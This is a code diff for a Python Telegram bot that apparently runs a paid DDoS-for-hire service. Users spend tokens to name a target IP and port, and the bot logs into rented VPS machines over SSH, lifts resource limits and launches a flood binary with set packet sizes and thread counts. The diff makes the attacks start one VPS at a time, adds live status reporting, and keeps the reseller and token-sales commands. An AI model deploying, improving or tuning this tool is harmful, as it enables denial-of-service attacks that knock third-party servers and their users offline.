@@ -12,7 +12,6 @@ import base64
 import logging
 from collections import deque
 
-
 # Configure logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -29,8 +28,8 @@ MONGODB_URIS = [
 DATABASE_NAME = "LUFFY2"  # 🗄️ Replace with your MongoDB database name
 
 # Attack Parameters
-PACKET_SIZE = 1011  # 📦 Packet size for attacks
-THREAD = 980  # 🧵 Number of threads
+PACKET_SIZE = 677  # 📦 Packet size for attacks
+THREAD = 950  # 🧵 Number of threads
 BINARY_NAME = "ranbal"  # ⚙️ Binary name
 BINARY_PATH = f"./{BINARY_NAME}"  # 📂 Path to binary on VPS
 
@@ -104,12 +103,19 @@ async def check_binary_on_vps(vps):
 
 # Attack Execution
 async def execute_attack_on_vps(task_id, user_id, ip, port, duration, vps):
-    """Execute attack on a single VPS."""
+    """Execute attack on a single VPS with ulimit commands."""
     try:
         async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
             duration_seconds = int(duration)  # Duration is always in seconds
-            command = f"{BINARY_PATH} {ip} {port} {duration_seconds}"
+            # Combine ulimit commands and the attack command
+            command = (
+                f"ulimit -f unlimited && "
+                f"ulimit -v unlimited && "
+                f"ulimit -s unlimited && "
+                f"{BINARY_PATH} {ip} {port} {duration_seconds} {PACKET_SIZE} {THREAD}"
+            )
             result = await conn.run(command)
+            logger.info(f"ulimit and attack output for {vps['ip']}:{vps['port']}: {result.stdout}")  # Log output for debugging
             db = get_mongo_client(user_id)
             vps_key = f"{vps['ip']}:{vps['port']}"
             status = "completed" if result.exit_status == 0 else "failed"
@@ -122,17 +128,19 @@ async def execute_attack_on_vps(task_id, user_id, ip, port, duration, vps):
         vps_key = f"{vps['ip']}:{vps['port']}"
         await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": "failed"}})
 
-async def update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, num_vps):
-    """Update attack status with a live timer."""
+async def update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, num_vps, vps_status_messages):
+    """Update attack status with a live timer and per-VPS status."""
     try:
         start_time = time.time()
         while time.time() - start_time < duration_seconds:
             remaining = max(0, duration_seconds - int(time.time() - start_time))
+            vps_status_text = "\n".join(vps_status_messages) if vps_status_messages else "⏳ Checking VPS..."
             timer_text = (
                 f"🚀 **Attack in Progress**\n"
                 f"🎯 Target: `{ip}:{port}`\n"
                 f"📦 Allocated Proxy: {num_vps}\n"
                 f"⏳ Time Left: `{remaining // 60}m {remaining % 60}s`\n"
+                f"📜 VPS Status:\n{vps_status_text}\n"
                 f"💻 Bot by @MrRanDom8"
             )
             try:
@@ -178,15 +186,69 @@ async def update_attack_timer(update, context, message_id, chat_id, duration_sec
             vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS
         logger.info(f"🔓 Released {len(vps_list)} VPS for user {chat_id}")
 
-async def execute_batch_attack(task_id, user_id, ip, port, duration, vps_list, update, context, message_id, chat_id, allocated_vps):
-    """Coordinate attack across all allocated VPS."""
+async def check_and_attack_vps(task_id, user_id, ip, port, duration, vps, vps_status_messages, context, chat_id, message_id):
+    """Check binary on a VPS and immediately start attack if binary exists, updating status."""
+    vps_key = f"{vps['ip']}:{vps['port']}"
+    if await check_binary_on_vps(vps):
+        logger.info(f"✅ Binary found on VPS {vps_key}, starting attack")
+        vps_status_messages.append(f"🌐 {vps_key}: Attack Started")
+        try:
+            # Update the Telegram message to show attack start
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=(
+                    f"🚀 **Attack in Progress**\n"
+                    f"🎯 Target: `{ip}:{port}`\n"
+                    f"📦 Allocated Proxy: {len(vps_status_messages)}\n"
+                    f"⏳ Time Left: Calculating...\n"
+                    f"📜 VPS Status:\n" + "\n".join(vps_status_messages) + "\n"
+                    f"💻 Bot by @MrRanDom8"
+                )
+            )
+        except Exception as e:
+            logger.error(f"🚨 Error updating Telegram message for VPS {vps_key}: {e}")
+        # Start the attack without waiting for completion
+        asyncio.create_task(execute_attack_on_vps(task_id, user_id, ip, port, duration, vps))
+        return True
+    else:
+        logger.error(f"❌ Binary not found on VPS {vps_key}")
+        db = get_mongo_client(user_id)
+        vps_status_messages.append(f"🌐 {vps_key}: Failed (Binary Not Found)")
+        await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": "failed"}})
+        try:
+            # Update the Telegram message to show failure
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=(
+                    f"🚀 **Attack in Progress**\n"
+                    f"🎯 Target: `{ip}:{port}`\n"
+                    f"📦 Allocated Proxy: {len(vps_status_messages)}\n"
+                    f"⏳ Time Left: Calculating...\n"
+                    f"📜 VPS Status:\n" + "\n".join(vps_status_messages) + "\n"
+                    f"💻 Bot by @MrRanDom8"
+                )
+            )
+        except Exception as e:
+            logger.error(f"🚨 Error updating Telegram message for VPS {vps_key}: {e}")
+        return False
+
+async def execute_sequential_attacks(task_id, user_id, ip, port, duration, vps_list, update, context, message_id, chat_id, allocated_vps):
+    """Check and start attacks sequentially, updating status for each VPS."""
     try:
         duration_seconds = int(duration)  # Duration is always in seconds
-        timer_task = asyncio.create_task(update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, len(allocated_vps)))
-        attack_task = asyncio.gather(*[execute_attack_on_vps(task_id, user_id, ip, port, duration, vps) for vps in vps_list])
-        await asyncio.gather(timer_task, attack_task)
+        vps_status_messages = []
+        timer_task = asyncio.create_task(update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, len(allocated_vps), vps_status_messages))
+        
+        # Sequentially check and start attack on each VPS
+        for vps in vps_list:
+            await check_and_attack_vps(task_id, user_id, ip, port, duration, vps, vps_status_messages, context, chat_id, message_id)
+            await asyncio.sleep(0.1)  # Small delay to prevent Telegram rate limiting
+        
+        await timer_task  # Wait for the timer to complete
     except Exception as e:
-        logger.error(f"🚨 Error in execute_batch_attack: {e}")
+        logger.error(f"🚨 Error in execute_sequential_attacks: {e}")
         final_text = (
             f"🚫 **Attack Failed Due to Error**\n"
             f"🎯 Target: `{ip}:{port}`\n"
@@ -250,7 +312,7 @@ async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🔓 /release_lock - Manually release attack lock\n"
             "📦 /vps [NUMBER_OF_VPS] - Set default number of VPS for attacks\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "💻 Bot by @MrRanDom8"
+            f"💻 Bot by @MrRanDom8"
         )
     elif user_id in RESELLER_IDS or role == "reseller":
         help_text = (
@@ -261,7 +323,7 @@ async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💰 /removetoken [ID] [AMOUNT] - remove tokens\n"
             "📋 /listusers - List all users\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "💻 Bot by @MrRanDom8"
+            f"💻 Bot by @MrRanDom8"
         )
     else:
         help_text = (
@@ -271,7 +333,7 @@ async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💰 /checktokens - Check token balance\n"
             "🛒 /buytokens [AMOUNT] - Buy tokens\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "💻 Bot by @MrRanDom8"
+            f"💻 Bot by @MrRanDom8"
         )
     await update.message.reply_text(help_text)
 
@@ -315,7 +377,7 @@ async def remove_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$inc": {"tokens": -amount}})
-    await update.message.reply_text(f"💰 **Success:** Removed `{amount}` tokens from `{target_id}`!\\n💻 Bot by @MrRanDom8")
+    await update.message.reply_text(f"💰 **Success:** Removed `{amount}` tokens from `{target_id}`!\n💻 Bot by @MrRanDom8")
 
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Ban a user from the bot."""
@@ -328,7 +390,6 @@ async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 1:
         await update.message.reply_text("❌ **Usage:** /ban [ID]")
         return
-    
 
     target_id = int(args[0])
     db = get_mongo_client(target_id)
@@ -346,7 +407,6 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 1:
         await update.message.reply_text("❌ **Usage:** /unban [ID]")
         return
-    
 
     target_id = int(args[0])
     db = get_mongo_client(target_id)
@@ -364,7 +424,6 @@ async def add_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 1:
         await update.message.reply_text("❌ **Usage:** /addreseller [ID]")
         return
-    
 
     target_id = int(args[0])
     db = get_mongo_client(target_id)
@@ -382,7 +441,6 @@ async def remove_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 1:
         await update.message.reply_text("❌ **Usage:** /removereseller [ID]")
         return
-    
 
     target_id = int(args[0])
     db = get_mongo_client(target_id)
@@ -417,7 +475,6 @@ async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 1:
         await update.message.reply_text("❌ **Usage:** /removeadmin [ID]")
         return
-    
 
     target_id = int(args[0])
     db = get_mongo_client(target_id)
@@ -455,7 +512,6 @@ async def add_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 4:
         await update.message.reply_text("❌ **Usage:** /add_vps [IP] [PORT] [USER] [PASS]")
         return
-    
 
     vps_ip, port, username, password = args[0], int(args[1]), args[2], args[3]
     db = get_mongo_client(None)
@@ -478,7 +534,6 @@ async def rem_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 2:
         await update.message.reply_text("❌ **Usage:** /rem_vps [IP] [PORT]")
         return
-    
 
     vps_ip, port = args[0], int(args[1])
     db = get_mongo_client(None)
@@ -649,23 +704,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         vps_locks[f"{vps['ip']}:{vps['port']}"] = True  # Mark as in use
     logger.info(f"🔒 Allocated {num_vps} Proxy to user {user_id} for attack on {ip}:{port}")
 
-    # Check if binary exists on all allocated VPS
-    missing_binary_vps = []
-    for vps in allocated_vps:
-        if not await check_binary_on_vps(vps):
-            missing_binary_vps.append(f"{vps['ip']}:{vps['port']}")
-    
-    if missing_binary_vps:
-        for vps in allocated_vps:
-            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS
-        await update.message.reply_text(
-            f"❌ **Error:** Binary `{BINARY_NAME}` not found on the following Proxy:\n"
-            f"{', '.join(missing_binary_vps)}\n"
-            f"Please run /setup to install the binary!\n"
-            f"💻 Bot by @MrRanDom8"
-        )
-        return
-
     try:
         await asyncio.to_thread(db.users.update_one, {"user_id": user_id}, {"$inc": {"tokens": -1}})
         task = {
@@ -686,9 +724,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🎯 Target: `{ip}:{port}`\n"
             f"📦 Allocated Proxy: {num_vps}\n"
             f"⏳ Time Left: Calculating...\n"
+            f"📜 VPS Status: Initializing...\n"
             f"💻 Bot by @MrRanDom8"
         )
-        await execute_batch_attack(task_id, user_id, ip, port, duration, allocated_vps, update, context, initial_msg.message_id, update.message.chat_id, allocated_vps)
+        await execute_sequential_attacks(task_id, user_id, ip, port, duration, allocated_vps, update, context, initial_msg.message_id, update.message.chat_id, allocated_vps)
     except Exception as e:
         logger.error(f"🚨 Error in attack for user {user_id}: {e}")
         for vps in allocated_vps:
@@ -758,15 +797,16 @@ async def buy_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Feedback Handler
 async def feedback_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle feedback from attack results."""
-    query = update.callback_query  # ✅ Fix: Define query
+    query = update.callback_query
     try:
         task_id, feedback = query.data.split("_")[1:]
+        db = get_mongo_client(None)  # Use global client for feedback
         await asyncio.to_thread(db.feedback.insert_one, {"task_id": task_id, "feedback": feedback})
         await query.answer("🌟 **Thanks for your feedback!**")
         await query.edit_message_text(f"✅ Feedback received: `{feedback}` for Task `{task_id}`")
     except Exception as e:
         await query.answer("❌ **Error processing feedback!**")
-        print(f"Feedback Error: {e}")  # Debugging
+        logger.error(f"Feedback Error: {e}")
 
 # Register Handlers
 app.add_handler(CommandHandler("start", start))
